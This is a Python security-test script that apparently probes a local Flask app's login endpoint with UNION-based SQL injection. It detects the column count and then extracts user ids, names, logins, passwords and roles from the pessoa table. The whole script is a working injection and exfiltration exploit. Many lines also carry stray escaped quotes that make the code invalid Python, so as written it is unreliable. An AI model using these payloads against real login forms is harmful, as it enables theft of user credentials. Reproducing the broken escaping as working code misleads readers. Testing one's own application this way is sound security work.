#!/usr/bin/env python3
# sql_login_union_exfiltrate.py (improved)
# Detect number of columns and attempt exfiltration via UNION SELECT in a robust way.
# Run: python .\tests\seguranca\sql_injection\cenarios\sql_login_union_exfiltrate.py

from pathlib import Path
from datetime import datetime
import shutil, requests, json, time, traceback, sys

BACKUP_DB = Path.cwd() / "pessoas_backup.db"
TARGET_DB = Path.cwd() / "instance" / "pessoas.db"
URL = "http://127.0.0.1:5000"
LOGIN_ENDPOINT = f"{URL}/login"

OUT_DIR = Path("respostas") / "sql_injection" / "cenarios" / "sql_login_union_exfiltrate"
OUT_DIR.mkdir(parents=True, exist_ok=True)
OUT_FILE = OUT_DIR / f"sql_login_union_exfiltrate_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"

def write(line):
    with OUT_FILE.open("a", encoding="utf-8") as f:
        f.write(line + "\\n")

def restore_db():
    if BACKUP_DB.exists():
        TARGET_DB.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(str(BACKUP_DB), str(TARGET_DB))
        return True, f"Restored {BACKUP_DB} -> {TARGET_DB}"
    else:
        return False, f"Backup {BACKUP_DB} not found"

def send(payload, session, timeout=10):
    try:
        r = session.post(LOGIN_ENDPOINT, json=payload, timeout=timeout)
        try:
            body = r.json()
        except Exception:
            body = r.text[:4000]
        return r.status_code, body, None
    except Exception as e:
        return None, None, traceback.format_exc()

def detect_columns(session, max_cols=12, marker='INJ_MARKER'):
    write(f"[detect_columns] trying up to {max_cols} columns with marker='{marker}'")
    for n in range(1, max_cols+1):
        # build union payload: put marker in first column and NULLs for rest
        cols = [f\"'{marker}'\"] + ['NULL'] * (n-1)
        union = " UNION SELECT " + ", ".join(cols) + " -- "
        login_payload = f\"x' {union}\"
        payload = {"login": login_payload, "senha": "x"}
        status, body, err = send(payload, session)
        write(f"[detect_columns] n={n} status={status} err={'yes' if err else 'no'}")
        if err:
            write(f"[detect_columns] exception for n={n}: {err}")
            continue
        # search marker in body
        try:
            s = json.dumps(body) if not isinstance(body, str) else body
            if marker in s:
                write(f"[detect_columns] marker detected with n={n}")
                return n
        except Exception as e:
            write(f"[detect_columns] parse error: {e}")
    write("[detect_columns] not found within max_cols")
    return None

def attempt_exfiltrate(session, ncols, expressions):
    write(f"[exfiltrate] attempting with ncols={ncols} expressions={expressions}")
    cols = expressions[:]
    if len(cols) < ncols:
        cols += ['NULL'] * (ncols - len(cols))
    union = " UNION SELECT " + ", ".join(cols) + " -- "
    login_payload = f\"x' {union}\"
    payload = {"login": login_payload, "senha": "x"}
    status, body, err = send(payload, session, timeout=15)
    write(f"[exfiltrate] status={status} err={'yes' if err else 'no'}")
    if err:
        write(f"[exfiltrate] exception:\\n{err}")
    else:
        write(f"[exfiltrate] body:\\n{json.dumps(body, ensure_ascii=False, indent=2) if isinstance(body,(dict,list)) else str(body)[:5000]}")

def main():
    write(f\"Data de execução: {datetime.utcnow().isoformat()}Z\")
    ok, msg = restore_db()
    write(f\"Restore: {ok} - {msg}\")
    write(f\"Target: {LOGIN_ENDPOINT}\")
    write(\"-\"*80)
    session = requests.Session()
    session.headers.update({\"User-Agent\": \"sqli-union-tester/1.0\"})

    try:
        n = detect_columns(session, max_cols=12, marker='INJ_MARKER_123')
        write(f\"detect_columns result: {n}\")
        if not n:
            write(\"Could not detect columns automatically. Try increasing max_cols or adjust marker.\")
        else:
            # prepare expressions to exfiltrate some columns via subselects, using LIMIT 1 to keep scalar results
            exprs = [
                \"(SELECT id FROM pessoa LIMIT 1)\",
                \"(SELECT nome FROM pessoa LIMIT 1)\",
                \"(SELECT login FROM pessoa LIMIT 1)\",
                \"(SELECT senha FROM pessoa LIMIT 1)\",
                \"(SELECT perfil FROM pessoa LIMIT 1)\",
                \"(SELECT status FROM pessoa LIMIT 1)\"
            ]
            attempt_exfiltrate(session, n, exprs)
    except Exception as e:
        write(f\"Main exception: {traceback.format_exc()}\")
    write(\"-\"*80)
    write(\"Resultado final: Feito. (verifique o bloco acima)\")
    print(\"Done. Evidence:\", OUT_FILE)

if __name__ == '__main__':
    main()
